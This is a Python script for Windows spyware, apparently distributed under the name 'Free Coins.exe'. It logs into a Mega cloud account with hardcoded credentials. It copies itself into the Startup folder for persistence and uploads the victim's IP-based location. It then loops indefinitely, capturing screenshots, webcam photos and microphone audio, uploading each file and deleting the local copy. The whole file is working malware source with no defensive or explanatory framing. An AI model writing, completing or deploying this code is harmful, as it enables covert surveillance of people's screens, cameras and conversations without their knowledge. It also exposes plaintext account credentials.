try:
    import time
    import os
    import shutil
    import cv2
    import getpass
    from datetime import datetime
    from PIL import ImageGrab
    from mega import Mega
    import pyaudio
    import wave
    import threading
    import requests
    import geocoder

except ModuleNotFoundError:
    import subprocess
    def install_modules(module_list):
        for module_name in module_list:
            try:
                subprocess.check_call(["pip", "install", module_name])
                print(f"Successfully installed {module_name}")
            except subprocess.CalledProcessError:
                print(f"Failed to install {module_name}")

    modules_to_install = ["mega.py", "opencv-python", "pillow"]
    install_modules(modules_to_install)

# set username/password
mega_email = 'lajex92681@meidecn.com'
mega_password = 'b@sit1218'

# mega signin
mega = Mega()
mega_login = mega.login(mega_email, mega_password)
print("logged in")

def get_public_ipv4():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        data = response.json()
        return data['ip']
    except requests.RequestException:
        return None

def get_location_from_ip(ip_address):
    g = geocoder.ip(ip_address)
    
    if g.ok:
        city = g.city if g.city else "Unknown City"
        country = g.country if g.country else "Unknown Country"
        location = f"{city}, {country}"
        return location
    else:
        return 'Location not found'

public_ipv4 = get_public_ipv4()
ip_address = public_ipv4
location = get_location_from_ip(ip_address)

# windows username
username = getpass.getuser()
current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
location_file_name = f'ip_location_{username}_{current_time}.txt'

# Save IP address and location in a text file
with open(location_file_name, 'w') as file:
    file.write(f"Public IPv4 Address: {ip_address}\n")
    file.write(f"Location: {location}\n")

# make folder called screenshots on mega storage
screenshots_folder = mega_login.find('screenshots')
webcam_folder= mega_login.find('webcam')
recordings_folder= mega_login.find('recordings')
location_folder= mega_login.find('locations')


if not screenshots_folder:
    screenshots_folder = mega_login.create_folder('screenshots')
else:
    screenshots_folder = screenshots_folder[0]

if not webcam_folder:
    webcam_folder = mega_login.create_folder('webcam')
else:
    webcam_folder = webcam_folder[0]

if not recordings_folder:
    recordings_folder = mega_login.create_folder('recordings')
else:
    recordings_folder = recordings_folder[0]

if not location_folder:
    location_folder = mega_login.create_folder('locations')
else:
    location_folder = location_folder[0]

try:

    home_dir = os.path.expanduser("~")

    # Specify the source file path
    source_file = "Free Coins.exe"

    # get path of startup folder
    startup_folder = os.path.join(home_dir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # get path of malware
    source_file_path = os.path.abspath(source_file)

    # Copy to startup folder
    shutil.copy(source_file_path, startup_folder)

except:
    pass

print("uploading location to location_folder")
mega_login.upload(location_file_name, location_folder)

os.remove(location_file_name)
# time b/w screenshots
screenshot_interval = 2

def screenshot_webcam():
    try:
        global counter
        # take screenshot
        screenshot = ImageGrab.grab()

        # Save screenshot with username and date, time
        current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f'screenshot_{username}_{current_time}.png'
        screenshot.save(filename)

        print("uploading to screenshots")
        # Upload to Mega
        mega_login.upload(filename, screenshots_folder)

        # Delete the screenshot 
        os.remove(filename)

        counter += 1

        # upload webcam pic
        if counter == 2:
            # take webcam picture
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()

            if ret:
                # save webcam picture
                current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                webcam_filename = f'webcam_{username}_{current_time}.jpg'
                cv2.imwrite(webcam_filename, frame)

                # upload webcam picture
                print("uploading to webcam") 
                mega_login.upload(webcam_filename, webcam_folder)

                # Delete the webcam picture 
                os.remove(webcam_filename)

            # reset counter
            counter = 0

        time.sleep(screenshot_interval)
    except:
        pass

def record_audio():
    try:
        current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        recording_file_name = f'recording_{username}_{current_time}.wav'
        duration = 10
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        print(f"Recording audio for {duration} seconds...")

        for _ in range(int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        wave_file = wave.open(recording_file_name, 'wb')
        wave_file.setnchannels(CHANNELS)
        wave_file.setsampwidth(p.get_sample_size(FORMAT))
        wave_file.setframerate(RATE)
        wave_file.writeframes(b''.join(frames))
        wave_file.close()

        print(f"uploading audio {recording_file_name}")

        mega_login.upload(recording_file_name, recordings_folder)

        os.remove(recording_file_name)

    except:
        pass

# hack loop
counter = 0
while True:
    # Create threads for each function
    screenshot_thread = threading.Thread(target=screenshot_webcam)
    audio_thread = threading.Thread(target=record_audio)

    # Start the threads
    screenshot_thread.start()
    audio_thread.start()

    # Wait for both threads to finish
    screenshot_thread.join()
    audio_thread.join()